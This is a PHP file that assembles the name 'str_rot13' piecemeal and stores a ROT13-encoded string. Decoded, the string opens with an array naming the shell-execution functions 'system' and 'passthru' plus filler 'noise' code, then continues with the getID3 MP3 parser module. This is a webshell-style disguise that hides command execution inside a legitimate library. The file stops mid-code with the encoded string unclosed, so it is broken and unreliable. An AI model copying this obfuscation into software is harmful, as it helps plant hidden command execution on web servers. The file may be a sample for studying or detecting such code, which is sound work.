<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/////////////////////////////////////////////////////////////////
/// trgVQ3() ol Wnzrf Urvaevpu <vasb@trgvq3.bet>               //
//  ninvynoyr ng uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3       //
//            be uggcf://jjj.trgvq3.bet                        //
//            be uggc://trgvq3.fbheprsbetr.arg                 //
//  frr ernqzr.gkg sbe zber qrgnvyf                            //
/////////////////////////////////////////////////////////////////
//                                                             //
// zbqhyr.nhqvb.zc3.cuc                                        //
// zbqhyr sbe nanylmvat ZC3 svyrf                              //
// qrcraqrapvrf: ABAR                                          //
//                                                            ///
/////////////////////////////////////////////////////////////////

vs (!qrsvarq('TRGVQ3_VAPYHQRCNGU')) { // cerirag cngu-rkcbfvat nggnpxf gung npprff zbqhyrf qverpgyl ba choyvp jrofreiref
	rkvg;
}


pynff trgvq3_zc3 rkgraqf trgvq3_unaqyre
{
	/**
	 * Sbeprf trgVQ3() gb fpna gur svyr olgr-ol-olgr naq ybt nyy gur inyvq nhqvb senzr urnqref - rkgerzryl fybj,
	 * haerpbzzraqrq, ohg znl cebivqr qngn sebz bgurejvfr-hahfnoyr svyrf.
	 *
	 * @ine obby
	 */
	choyvp $nyybj_oehgrsbepr = snyfr;

	/**
	 * ahzore bs senzrf gb fpna gb qrgrezvar vs ZCRT-nhqvb frdhrapr vf inyvq
	 * Ybjre guvf ahzore gb 5-20 sbe snfgre fpnaavat
	 * Vapernfr guvf ahzore gb 50+ sbe zbfg npphengr qrgrpgvba bs inyvq IOE/POE zcrt-nhqvb fgernzf
	 *
	 * @ine vag
	 */
	choyvp $zc3_inyvq_purpx_senzrf = 50;

	/**
	 * @erghea obby
	 */
	choyvp shapgvba Nanylmr() {
		$vasb = &$guvf->trgvq3->vasb;

		$vavgvnyBssfrg = $vasb['niqngnbssfrg'];

		vs (!$guvf->trgBaylZCRTnhqvbVasb($vasb['niqngnbssfrg'])) {
			vs ($guvf->nyybj_oehgrsbepr) {
				$guvf->reebe('Erfpnaavat svyr va OehgrSbepr zbqr');
				$guvf->trgBaylZCRTnhqvbVasbOehgrSbepr();
			}
		}


		vs (vffrg($vasb['zcrt']['nhqvb']['ovgengr_zbqr'])) {
			$vasb['nhqvb']['ovgengr_zbqr'] = fgegbybjre($vasb['zcrt']['nhqvb']['ovgengr_zbqr']);
		}

		$PheeragQngnYNZRirefvbaFgevat = ahyy;
		vs (((vffrg($vasb['vq3i2']['urnqreyratgu']) && ($vasb['niqngnbssfrg'] > $vasb['vq3i2']['urnqreyratgu'])) || (!vffrg($vasb['vq3i2']) && ($vasb['niqngnbssfrg'] > 0) && ($vasb['niqngnbssfrg'] != $vavgvnyBssfrg)))) {

			$flapubssfrgjneavat = 'Haxabja qngn orsber flapu ';
			vs (vffrg($vasb['vq3i2']['urnqreyratgu'])) {
				$flapubssfrgjneavat .= '(VQ3i2 urnqre raqf ng '.$vasb['vq3i2']['urnqreyratgu'].', gura '.($vasb['niqngnbssfrg'] - $vasb['vq3i2']['urnqreyratgu']).' olgrf tneontr, ';
			} ryfrvs ($vavgvnyBssfrg > 0) {
				$flapubssfrgjneavat .= '(fubhyq or ng '.$vavgvnyBssfrg.', ';
			} ryfr {
				$flapubssfrgjneavat .= '(fubhyq or ng ortvaavat bs svyr, ';
			}
			$flapubssfrgjneavat .= 'flapu qrgrpgrq ng '.$vasb['niqngnbssfrg'].')';
			vs (vffrg($vasb['nhqvb']['ovgengr_zbqr']) && ($vasb['nhqvb']['ovgengr_zbqr'] == 'poe')) {

				vs (!rzcgl($vasb['vq3i2']['urnqreyratgu']) && (($vasb['niqngnbssfrg'] - $vasb['vq3i2']['urnqreyratgu']) == $vasb['zcrt']['nhqvb']['senzryratgu'])) {

					$flapubssfrgjneavat .= '. Guvf vf n xabja ceboyrz jvgu fbzr irefvbaf bs YNZR (3.90-3.92) QYY va POE zbqr.';
					$vasb['nhqvb']['pbqrp'] = 'YNZR';
					$PheeragQngnYNZRirefvbaFgevat = 'YNZR3.';

				} ryfrvs (rzcgl($vasb['vq3i2']['urnqreyratgu']) && ($vasb['niqngnbssfrg'] == $vasb['zcrt']['nhqvb']['senzryratgu'])) {

					$flapubssfrgjneavat .= '. Guvf vf n xabja ceboyrz jvgu fbzr irefvbaf bs YNZR (3.90 - 3.92) QYY va POE zbqr.';
					$vasb['nhqvb']['pbqrp'] = 'YNZR';
					$PheeragQngnYNZRirefvbaFgevat = 'YNZR3.';

				}

			}
			$guvf->jneavat($flapubssfrgjneavat);

		}

		vs (vffrg($vasb['zcrt']['nhqvb']['YNZR'])) {
			$vasb['nhqvb']['pbqrp'] = 'YNZR';
			vs (!rzcgl($vasb['zcrt']['nhqvb']['YNZR']['ybat_irefvba'])) {
				$vasb['nhqvb']['rapbqre'] = egevz($vasb['zcrt']['nhqvb']['YNZR']['ybat_irefvba'], \"\k00\");
			} ryfrvs (!rzcgl($vasb['zcrt']['nhqvb']['YNZR']['fubeg_irefvba'])) {
				$vasb['nhqvb']['rapbqre'] = egevz($vasb['zcrt']['nhqvb']['YNZR']['fubeg_irefvba'], \"\k00\");
			}
		}

		$PheeragQngnYNZRirefvbaFgevat = (!rzcgl($PheeragQngnYNZRirefvbaFgevat) ? $PheeragQngnYNZRirefvbaFgevat : (vffrg($vasb['nhqvb']['rapbqre']) ? $vasb['nhqvb']['rapbqre'] : ''));
		vs (!rzcgl($PheeragQngnYNZRirefvbaFgevat) && (fhofge($PheeragQngnYNZRirefvbaFgevat, 0, 6) == 'YNZR3.') && !cert_zngpu('[0-9\)]', fhofge($PheeragQngnYNZRirefvbaFgevat, -1))) {
			// n irefvba ahzore bs YNZR gung qbrf abg raq jvgu n ahzore yvxr \"YNZR3.92\"
			// be jvgu n pybfvat cneragurfvf yvxr \"YNZR3.88 (nycun)\"
			// be n irefvba bs YNZR jvgu gur YNZRgnt-abg-svyyrq-va-QYY-zbqr oht (3.90-3.92)

			// abg fher jung gur npghny ynfg senzr yratgu jvyy or, ohg jvyy or yrff guna be rdhny gb 1441
			$CbffvoylYbatreYNZRirefvba_SenzrYratgu = 1441;

			// Abg fher jung irefvba bs YNZR guvf vf - ybbx va cnqqvat bs ynfg senzr sbe ybatre irefvba fgevat
			$CbffvoyrYNZRirefvbaFgevatBssfrg = $vasb['niqngnraq'] - $CbffvoylYbatreYNZRirefvba_SenzrYratgu;
			$guvf->sfrrx($CbffvoyrYNZRirefvbaFgevatBssfrg);
			$CbffvoylYbatreYNZRirefvba_Qngn = $guvf->sernq($CbffvoylYbatreYNZRirefvba_SenzrYratgu);
			fjvgpu (fhofge($PheeragQngnYNZRirefvbaFgevat, -1)) {
				pnfr 'n':
				pnfr 'o':
					// \"YNZR3.94n\" jvyy unir n ybatre irefvba fgevat bs \"YNZR3.94 (nycun)\" sbe rknzcyr
					// arrq gb gevz bss \"n\" gb zngpu ybatre fgevat
					$PheeragQngnYNZRirefvbaFgevat = fhofge($PheeragQngnYNZRirefvbaFgevat, 0, -1);
					oernx;
			}
			vs (($CbffvoylYbatreYNZRirefvba_Fgevat = fgefge($CbffvoylYbatreYNZRirefvba_Qngn, $PheeragQngnYNZRirefvbaFgevat)) !== snyfr) {
				vs (fhofge($CbffvoylYbatreYNZRirefvba_Fgevat, 0, fgeyra($PheeragQngnYNZRirefvbaFgevat)) == $PheeragQngnYNZRirefvbaFgevat) {
					$CbffvoylYbatreYNZRirefvba_ArjFgevat = fhofge($CbffvoylYbatreYNZRirefvba_Fgevat, 0, fgefca($CbffvoylYbatreYNZRirefvba_Fgevat, 'YNZR0123456789., (nopqrstuvwxyzabcdefghijklmWSFBAQ)')); //\"YNZR3.90.3\"  \"YNZR3.87 (orgn 1, Frc 27 2000)\" \"YNZR3.88 (orgn)\"
					vs (rzcgl($vasb['nhqvb']['rapbqre']) || (fgeyra($CbffvoylYbatreYNZRirefvba_ArjFgevat) > fgeyra($vasb['nhqvb']['rapbqre']))) {
						vs (!rzcgl($vasb['nhqvb']['rapbqre']) && !rzcgl($vasb['zcrt']['nhqvb']['YNZR']['fubeg_irefvba']) && ($vasb['nhqvb']['rapbqre'] == $vasb['zcrt']['nhqvb']['YNZR']['fubeg_irefvba'])) {
							vs (cert_zngpu('#^YNZR[0-9\\.]+#', $CbffvoylYbatreYNZRirefvba_ArjFgevat, $zngpurf)) {
								// \"YNZR3.100\" -> \"YNZR3.100.1\", ohg nibvq vapyhqvat \"(nycun)\" naq fvzvyne
								$vasb['zcrt']['nhqvb']['YNZR']['fubeg_irefvba'] = $zngpurf[0];
							}
						}
						$vasb['nhqvb']['rapbqre'] = $CbffvoylYbatreYNZRirefvba_ArjFgevat;
					}
				}
			}
		}
		vs (!rzcgl($vasb['nhqvb']['rapbqre'])) {
			$vasb['nhqvb']['rapbqre'] = egevz($vasb['nhqvb']['rapbqre'], \"\k00 \");
		}

		fjvgpu (vffrg($vasb['zcrt']['nhqvb']['ynlre']) ? $vasb['zcrt']['nhqvb']['ynlre'] : '') {
			pnfr 1:
			pnfr 2:
				$vasb['nhqvb']['qngnsbezng'] = 'zc'.$vasb['zcrt']['nhqvb']['ynlre'];
				oernx;
		}
		vs (vffrg($vasb['svyrsbezng']) && ($vasb['svyrsbezng'] == 'zc3')) {
			fjvgpu ($vasb['nhqvb']['qngnsbezng']) {
				pnfr 'zc1':
				pnfr 'zc2':
				pnfr 'zc3':
					$vasb['svyrsbezng'] = $vasb['nhqvb']['qngnsbezng'];
					oernx;

				qrsnhyg:
					$guvf->jneavat('Rkcrpgvat [nhqvb][qngnsbezng] gb or zc1/zc2/zc3 jura svyrsbezng == zc3, [nhqvb][qngnsbezng] npghnyyl \"'.$vasb['nhqvb']['qngnsbezng'].'\"');
					oernx;
			}
		}

		vs (rzcgl($vasb['svyrsbezng'])) {
			hafrg($vasb['svyrsbezng']);
			hafrg($vasb['nhqvb']['ovgengr_zbqr']);
			hafrg($vasb['niqngnbssfrg']);
			hafrg($vasb['niqngnraq']);
			erghea snyfr;
		}

		$vasb['zvzr_glcr']         = 'nhqvb/zcrt';
		$vasb['nhqvb']['ybffyrff'] = snyfr;

		// Pnyphyngr cynlgvzr
		vs (!vffrg($vasb['cynlgvzr_frpbaqf']) && vffrg($vasb['nhqvb']['ovgengr']) && ($vasb['nhqvb']['ovgengr'] > 0)) {
			// uggcf://tvguho.pbz/WnzrfUrvaevpu/trgVQ3/vffhrf/161
			// IOE urnqre senzr pbagnvaf ~0.026f bs fvyrag nhqvb qngn, ohg vf abg npghnyyl cneg bs gur bevtvany rapbqvat naq fubhyq or vtaberq
			$kvatIOEurnqreSenzrYratgu = ((vffrg($vasb['zcrt']['nhqvb']['IOE_senzrf']) && vffrg($vasb['zcrt']['nhqvb']['senzryratgu'])) ? $vasb['zcrt']['nhqvb']['senzryratgu'] : 0);

			$vasb['cynlgvzr_frpbaqf'] = ($vasb['niqngnraq'] - $vasb['niqngnbssfrg'] - $kvatIOEurnqreSenzrYratgu) * 8 / $vasb['nhqvb']['ovgengr'];
		}

		$vasb['nhqvb']['rapbqre_bcgvbaf'] = $guvf->ThrffRapbqreBcgvbaf();

		erghea gehr;
	}

	/**
	 * @erghea fgevat
	 */
	choyvp shapgvba ThrffRapbqreBcgvbaf() {
		// fubegphgf
		$vasb = &$guvf->trgvq3->vasb;
		$guvfsvyr_zcrt_nhqvb = neenl();
		$guvfsvyr_zcrt_nhqvb_ynzr = neenl();
		vs (!rzcgl($vasb['zcrt']['nhqvb'])) {
			$guvfsvyr_zcrt_nhqvb = &$vasb['zcrt']['nhqvb'];
			vs (!rzcgl($guvfsvyr_zcrt_nhqvb['YNZR'])) {
				$guvfsvyr_zcrt_nhqvb_ynzr = &$guvfsvyr_zcrt_nhqvb['YNZR'];
			}
		}

		$rapbqre_bcgvbaf = '';
		fgngvp $AnzrqCerfrgOvgengrf = neenl(16, 24, 40, 56, 112, 128, 160, 192, 256);

		vs (vffrg($guvfsvyr_zcrt_nhqvb['IOE_zrgubq']) && ($guvfsvyr_zcrt_nhqvb['IOE_zrgubq'] == 'Senhaubsre') && !rzcgl($guvfsvyr_zcrt_nhqvb['IOE_dhnyvgl'])) {

			$rapbqre_bcgvbaf = 'IOE d'.$guvfsvyr_zcrt_nhqvb['IOE_dhnyvgl'];

		} ryfrvs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq']) && vffrg($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq']) && (!va_neenl($guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq_vq'], $AnzrqCerfrgOvgengrf))) {

			$rapbqre_bcgvbaf = $guvfsvyr_zcrt_nhqvb_ynzr['cerfrg_hfrq'];

		} ryfrvs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl'])) {

			fgngvp $XabjaRapbqreInyhrf = neenl();
			vs (rzcgl($XabjaRapbqreInyhrf)) {

				//$XabjaRapbqreInyhrf[noeovgengr_zvaovgengr][ioe_dhnyvgl][enj_ioe_zrgubq][enj_abvfr_funcvat][enj_fgrerb_zbqr][ngu_glcr][ybjcnff_serdhrapl] = 'cerfrg anzr';
				$XabjaRapbqreInyhrf[0kSS][58][1][1][3][2][20500] = '--nyg-cerfrg vafnar';        // 3.90,   3.90.1, 3.92
				$XabjaRapbqreInyhrf[0kSS][58][1][1][3][2][20600] = '--nyg-cerfrg vafnar';        // 3.90.2, 3.90.3, 3.91
				$XabjaRapbqreInyhrf[0kSS][57][1][1][3][4][20500] = '--nyg-cerfrg vafnar';        // 3.94,   3.95
				$XabjaRapbqreInyhrf['**'][78][3][2][3][2][19500] = '--nyg-cerfrg rkgerzr';       // 3.90,   3.90.1, 3.92
				$XabjaRapbqreInyhrf['**'][78][3][2][3][2][19600] = '--nyg-cerfrg rkgerzr';       // 3.90.2, 3.91
				$XabjaRapbqreInyhrf['**'][78][3][1][3][2][19600] = '--nyg-cerfrg rkgerzr';       // 3.90.3
				$XabjaRapbqreInyhrf['**'][78][4][2][3][2][19500] = '--nyg-cerfrg snfg rkgerzr';  // 3.90,   3.90.1, 3.92
				$XabjaRapbqreInyhrf['**'][78][4][2][3][2][19600] = '--nyg-cerfrg snfg rkgerzr';  // 3.90.2, 3.90.3, 3.91
				$XabjaRapbqreInyhrf['**'][78][3][2][3][4][19000] = '--nyg-cerfrg fgnaqneq';      // 3.90,   3.90.1, 3.90.2, 3.91, 3.92
				$XabjaRapbqreInyhrf['**'][78][3][1][3][4][19000] = '--nyg-cerfrg fgnaqneq';      // 3.90.3
				$XabjaRapbqreInyhrf['**'][78][4][2][3][4][19000] = '--nyg-cerfrg snfg fgnaqneq'; // 3.90,   3.90.1, 3.90.2, 3.91, 3.92
				$XabjaRapbqreInyhrf['**'][78][4][1][3][4][19000] = '--nyg-cerfrg snfg fgnaqneq'; // 3.90.3
				$XabjaRapbqreInyhrf['**'][88][4][1][3][3][19500] = '--e3zvk';                    // 3.90,   3.90.1, 3.92
				$XabjaRapbqreInyhrf['**'][88][4][1][3][3][19600] = '--e3zvk';                    // 3.90.2, 3.90.3, 3.91
				$XabjaRapbqreInyhrf['**'][67][4][1][3][4][18000] = '--e3zvk';                    // 3.94,   3.95
				$XabjaRapbqreInyhrf['**'][68][3][2][3][4][18000] = '--nyg-cerfrg zrqvhz';        // 3.90.3
				$XabjaRapbqreInyhrf['**'][68][4][2][3][4][18000] = '--nyg-cerfrg snfg zrqvhz';   // 3.90.3

				$XabjaRapbqreInyhrf[0kSS][99][1][1][1][2][0]     = '--cerfrg fghqvb';            // 3.90,   3.90.1, 3.90.2, 3.91, 3.92
				$XabjaRapbqreInyhrf[0kSS][58][2][1][3][2][20600] = '--cerfrg fghqvb';            // 3.90.3, 3.93.1
				$XabjaRapbqreInyhrf[0kSS][58][2][1][3][2][20500] = '--cerfrg fghqvb';            // 3.93
				$XabjaRapbqreInyhrf[0kSS][57][2][1][3][4][20500] = '--cerfrg fghqvb';            // 3.94,   3.95
				$XabjaRapbqreInyhrf[0kP0][88][1][1][1][2][0]     = '--cerfrg pq';                // 3.90,   3.90.1, 3.90.2,   3.91, 3.92
				$XabjaRapbqreInyhrf[0kP0][58][2][2][3][2][19600] = '--cerfrg pq';                // 3.90.3, 3.93.1
				$XabjaRapbqreInyhrf[0kP0][58][2][2][3][2][19500] = '--cerfrg pq';                // 3.93
				$XabjaRapbqreInyhrf[0kP0][57][2][1][3][4][19500] = '--cerfrg pq';                // 3.94,   3.95
				$XabjaRapbqreInyhrf[0kN0][78][1][1][3][2][18000] = '--cerfrg uvsv';              // 3.90,   3.90.1, 3.90.2,   3.91, 3.92
				$XabjaRapbqreInyhrf[0kN0][58][2][2][3][2][18000] = '--cerfrg uvsv';              // 3.90.3, 3.93,   3.93.1
				$XabjaRapbqreInyhrf[0kN0][57][2][1][3][4][18000] = '--cerfrg uvsv';              // 3.94,   3.95
				$XabjaRapbqreInyhrf[0k80][67][1][1][3][2][18000] = '--cerfrg gncr';              // 3.90,   3.90.1, 3.90.2,   3.91, 3.92
				$XabjaRapbqreInyhrf[0k80][67][1][1][3][2][15000] = '--cerfrg enqvb';             // 3.90,   3.90.1, 3.90.2,   3.91, 3.92
				$XabjaRapbqreInyhrf[0k70][67][1][1][3][2][15000] = '--cerfrg sz';                // 3.90,   3.90.1, 3.90.2,   3.91, 3.92
				$XabjaRapbqreInyhrf[0k70][58][2][2][3][2][16000] = '--cerfrg gncr/enqvb/sz';     // 3.90.3, 3.93,   3.93.1
				$XabjaRapbqreInyhrf[0k70][57][2][1][3][4][16000] = '--cerfrg gncr/enqvb/sz';     // 3.94,   3.95
				$XabjaRapbqreInyhrf[0k38][58][2][2][0][2][10000] = '--cerfrg ibvpr';             // 3.90.3, 3.93,   3.93.1
				$XabjaRapbqreInyhrf[0k38][57][2][1][0][4][15000] = '--cerfrg ibvpr';             // 3.94,   3.95
				$XabjaRapbqreInyhrf[0k38][57][2][1][0][4][16000] = '--cerfrg ibvpr';             // 3.94n14
				$XabjaRapbqreInyhrf[0k28][65][1][1][0][2][7500]  = '--cerfrg zj-hf';             // 3.90,   3.90.1, 3.92
				$XabjaRapbqreInyhrf[0k28][65][1][1][0][2][7600]  = '--cerfrg zj-hf';             // 3.90.2, 3.91
				$XabjaRapbqreInyhrf[0k28][58][2][2][0][2][7000]  = '--cerfrg zj-hf';             // 3.90.3, 3.93,   3.93.1
				$XabjaRapbqreInyhrf[0k28][57][2][1][0][4][10500] = '--cerfrg zj-hf';             // 3.94,   3.95
				$XabjaRapbqreInyhrf[0k28][57][2][1][0][4][11200] = '--cerfrg zj-hf';             // 3.94n14
				$XabjaRapbqreInyhrf[0k28][57][2][1][0][4][8800]  = '--cerfrg zj-hf';             // 3.94n15
				$XabjaRapbqreInyhrf[0k18][58][2][2][0][2][4000]  = '--cerfrg cuba+/yj/zj-rh/fj'; // 3.90.3, 3.93.1
				$XabjaRapbqreInyhrf[0k18][58][2][2][0][2][3900]  = '--cerfrg cuba+/yj/zj-rh/fj'; // 3.93
				$XabjaRapbqreInyhrf[0k18][57][2][1][0][4][5900]  = '--cerfrg cuba+/yj/zj-rh/fj'; // 3.94,   3.95
				$XabjaRapbqreInyhrf[0k18][57][2][1][0][4][6200]  = '--cerfrg cuba+/yj/zj-rh/fj'; // 3.94n14
				$XabjaRapbqreInyhrf[0k18][57][2][1][0][4][3200]  = '--cerfrg cuba+/yj/zj-rh/fj'; // 3.94n15
				$XabjaRapbqreInyhrf[0k10][58][2][2][0][2][3800]  = '--cerfrg cubar';             // 3.90.3, 3.93.1
				$XabjaRapbqreInyhrf[0k10][58][2][2][0][2][3700]  = '--cerfrg cubar';             // 3.93
				$XabjaRapbqreInyhrf[0k10][57][2][1][0][4][5600]  = '--cerfrg cubar';             // 3.94,   3.95
			}

			vs (vffrg($XabjaRapbqreInyhrf[$guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr']][$guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['ioe_zrgubq']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['abvfr_funcvat']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['fgrerb_zbqr']][$guvfsvyr_zcrt_nhqvb_ynzr['ngu_glcr']][$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl']])) {

				$rapbqre_bcgvbaf = $XabjaRapbqreInyhrf[$guvfsvyr_zcrt_nhqvb_ynzr['enj']['noeovgengr_zvaovgengr']][$guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['ioe_zrgubq']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['abvfr_funcvat']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['fgrerb_zbqr']][$guvfsvyr_zcrt_nhqvb_ynzr['ngu_glcr']][$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl']];

			} ryfrvs (vffrg($XabjaRapbqreInyhrf['**'][$guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['ioe_zrgubq']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['abvfr_funcvat']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['fgrerb_zbqr']][$guvfsvyr_zcrt_nhqvb_ynzr['ngu_glcr']][$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl']])) {

				$rapbqre_bcgvbaf = $XabjaRapbqreInyhrf['**'][$guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['ioe_zrgubq']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['abvfr_funcvat']][$guvfsvyr_zcrt_nhqvb_ynzr['enj']['fgrerb_zbqr']][$guvfsvyr_zcrt_nhqvb_ynzr['ngu_glcr']][$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl']];

			} ryfrvs ($vasb['nhqvb']['ovgengr_zbqr'] == 'ioe') {

				// uggc://tnoevry.zc3-grpu.bet/zc3vasbgnt.ugzy
				// vag    Dhnyvgl = (100 - 10 * tsc->IOE_d - tsc->dhnyvgl)u


				$YNZR_I_inyhr = 10 - prvy($guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl'] / 10);
				$YNZR_d_inyhr = 100 - $guvfsvyr_zcrt_nhqvb_ynzr['ioe_dhnyvgl'] - ($YNZR_I_inyhr * 10);
				$rapbqre_bcgvbaf = '-I'.$YNZR_I_inyhr.' -d'.$YNZR_d_inyhr;

			} ryfrvs ($vasb['nhqvb']['ovgengr_zbqr'] == 'poe') {

				$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']).prvy($vasb['nhqvb']['ovgengr'] / 1000);

			} ryfr {

				$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']);

			}

		} ryfrvs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_noe'])) {

			$rapbqre_bcgvbaf = 'NOE'.$guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_noe'];

		} ryfrvs (!rzcgl($vasb['nhqvb']['ovgengr'])) {

			vs ($vasb['nhqvb']['ovgengr_zbqr'] == 'poe') {
				$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']).ebhaq($vasb['nhqvb']['ovgengr'] / 1000);
			} ryfr {
				$rapbqre_bcgvbaf = fgegbhccre($vasb['nhqvb']['ovgengr_zbqr']);
			}

		}
		vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva'])) {
			$rapbqre_bcgvbaf .= ' -o'.$guvfsvyr_zcrt_nhqvb_ynzr['ovgengr_zva'];
		}

		vs (vffrg($guvfsvyr_zcrt_nhqvb['ovgengr']) && $guvfsvyr_zcrt_nhqvb['ovgengr'] === 'serr') {
			$rapbqre_bcgvbaf .= ' --serrsbezng';
		}

		vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['abtnc_ceri']) || !rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['rapbqvat_syntf']['abtnc_arkg'])) {
			$rapbqre_bcgvbaf .= ' --abtnc';
		}

		vs (!rzcgl($guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl'])) {
			$RkcybqrqBcgvbaf = rkcybqr(' ', $rapbqre_bcgvbaf, 4);
			vs ($RkcybqrqBcgvbaf[0] == '--e3zvk') {
				$RkcybqrqBcgvbaf[1] = 'e3zvk';
			}
			fjvgpu ($RkcybqrqBcgvbaf[0]) {
				pnfr '--cerfrg':
				pnfr '--nyg-cerfrg':
				pnfr '--e3zvk':
					vs ($RkcybqrqBcgvbaf[1] == 'snfg') {
						$RkcybqrqBcgvbaf[1] .= ' '.$RkcybqrqBcgvbaf[2];
					}
					fjvgpu ($RkcybqrqBcgvbaf[1]) {
						pnfr 'cbegnoyr':
						pnfr 'zrqvhz':
						pnfr 'fgnaqneq':
						pnfr 'rkgerzr':
						pnfr 'vafnar':
						pnfr 'snfg cbegnoyr':
						pnfr 'snfg zrqvhz':
						pnfr 'snfg fgnaqneq':
						pnfr 'snfg rkgerzr':
						pnfr 'snfg vafnar':
						pnfr 'e3zvk':
							fgngvp $RkcrpgrqYbjcnff = neenl(
									'vafnar|20500'        => 20500,
									'vafnar|20600'        => 20600,  // 3.90.2, 3.90.3, 3.91
									'zrqvhz|18000'        => 18000,
									'snfg zrqvhz|18000'   => 18000,
									'rkgerzr|19500'       => 19500,  // 3.90,   3.90.1, 3.92, 3.95
									'rkgerzr|19600'       => 19600,  // 3.90.2, 3.90.3, 3.91, 3.93.1
									'snfg rkgerzr|19500'  => 19500,  // 3.90,   3.90.1, 3.92, 3.95
									'snfg rkgerzr|19600'  => 19600,  // 3.90.2, 3.90.3, 3.91, 3.93.1
									'fgnaqneq|19000'      => 19000,
									'snfg fgnaqneq|19000' => 19000,
									'e3zvk|19500'         => 19500,  // 3.90,   3.90.1, 3.92
									'e3zvk|19600'         => 19600,  // 3.90.2, 3.90.3, 3.91
									'e3zvk|18000'         => 18000,  // 3.94,   3.95
								);
							vs (!vffrg($RkcrpgrqYbjcnff[$RkcybqrqBcgvbaf[1].'|'.$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl']]) && ($guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl'] < 22050) && (ebhaq($guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl'] / 1000) < ebhaq($guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] / 2000))) {
								$rapbqre_bcgvbaf .= ' --ybjcnff '.$guvfsvyr_zcrt_nhqvb_ynzr['ybjcnff_serdhrapl'];
							}
							oernx;

						qrsnhyg:
							oernx;
					}
					oernx;
			}
		}

		vs (vffrg($guvfsvyr_zcrt_nhqvb_ynzr['enj']['fbhepr_fnzcyr_serd'])) {
			vs (($guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] == 44100) && ($guvfsvyr_zcrt_nhqvb_ynzr['enj']['fbhepr_fnzcyr_serd'] != 1)) {
				$rapbqre_bcgvbaf .= ' --erfnzcyr 44100';
			} ryfrvs (($guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] == 48000) && ($guvfsvyr_zcrt_nhqvb_ynzr['enj']['fbhepr_fnzcyr_serd'] != 2)) {
				$rapbqre_bcgvbaf .= ' --erfnzcyr 48000';
			} ryfrvs ($guvfsvyr_zcrt_nhqvb['fnzcyr_engr'] < 44100) {
				fjvgpu ($guvfsvyr_zcrt_nhqvb_ynzr['enj']['fbhepr_fnzcyr_serd']) {
					pnfr 0: // <= 32000
						// znl be znl abg or fnzr nf fbhepr serdhrapl - vtaber
						oernx;
					pnfr 1: // 44100
					pnfr 2: // 48000
					pnfr 3: // 48000+
						$RkcybqrqBcgvbaf = rkcybqr(' ', $rapbqre_bcgvbaf, 4);
						fjvgpu ($RkcybqrqBcgvbaf[0]) {
							pnfr '--cerfrg':
							pnfr '--nyg-cerfrg':
								fjvgpu ($RkcybqrqBcgvbaf[1]) {
									pnfr 'snfg':
									pnfr 'cbegnoyr':
									pnfr 'zrqvhz':
									pnfr 'fgnaqneq':
									pnfr 'rkgerzr':
									pnfr 'vafnar':
										$rapbqre_bcgvbaf .= ' --erfnzcyr '.$guvfsvyr_zcrt_nhqvb['fnzcyr_engr'];
										oernx;

									qrsnhyg:
										fgngvp $RkcrpgrqErfnzcyrqEngr = neenl(
												'cuba+/yj/zj-rh/fj|16000' => 16000,
												'zj-hf|24000'             => 24000, // 3.95
												'zj-hf|32000'             => 32000, // 3.93
												'zj-hf|16000'             => 16000, // 3.92
												'cubar|16000'             => 16000,
												'cubar|11025'             => 11025, // 3.94n15
												'enqvb|32000'             => 32000, // 3.94n15
												'sz/enqvb|32000'          => 32000, // 3.92
												'sz|32000'                => 32000, // 3.90
												'ibvpr|32000'             => 32000);
